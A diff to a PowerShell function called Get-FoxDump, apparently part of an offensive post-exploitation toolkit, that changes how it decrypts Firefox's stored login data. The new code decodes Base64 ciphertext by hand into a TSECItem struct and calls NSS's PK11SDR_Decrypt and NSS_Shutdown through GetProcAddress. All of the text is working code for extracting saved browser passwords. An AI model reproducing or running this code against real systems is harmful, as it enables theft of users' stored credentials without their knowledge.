@@ -846,14 +846,15 @@ Function Get-FoxDump
             [string]$cipherText
         )
 
-        #Cast the result from the Decode buffer function as a TSECItem struct and create an empty struct. Decrypt the cipher text and then
-        #store it inside the empty struct.
-        $Result = $NSSBase64_DecodeBuffer.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $cipherText, $cipherText.Length)
-        Write-Verbose "[+]NSSBase64_DecodeBuffer Result: $Result"
-        $ResultPtr = $Result -as [IntPtr]
-        $offset = $ResultPtr.ToInt64()
-        $newptr = New-Object System.IntPtr -ArgumentList $offset
-        $TSECStructData = $newptr -as $TSECItem
+        $Bytes = [System.Convert]::FromBase64String($cipherText)
+        $Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Bytes.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $Buffer, $Bytes.Length)
+
+        $TSECStructData = New-Object TSECItem
+        $TSECStructData.SECItemType = 0
+        $TSECStructData.SECItemData = $Buffer
+        $TSECStructData.SECItemLen = $Bytes.Length
+
         $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($TSECStructData))
         $EmptyTSECItem = $ptr -as $TSECItem
         $result = $PK11SDR_Decrypt.Invoke([ref]$TSECStructData, [ref]$EmptyTSECItem, 0)
@@ -879,9 +880,9 @@ Function Get-FoxDump
     $NSSInitDelegates = Get-DelegateType @([string]) ([long])
     $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)
 
-    $NSSBase64_DecodeBufferAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSSBase64_DecodeBuffer")
-    $NSSBase64_DecodeBufferDelegates = Get-DelegateType @([IntPtr], [IntPtr], [string], [int]) ([int])
-    $NSSBase64_DecodeBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSBase64_DecodeBufferAddr, $NSSBase64_DecodeBufferDelegates)
+    $NSSShutdownAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Shutdown")
+    $NSSShutdownDelegates = Get-DelegateType @() ([int])
+    $NSS_Shutdown = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSShutdownAddr, $NSSShutdownDelegates)
 
     $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
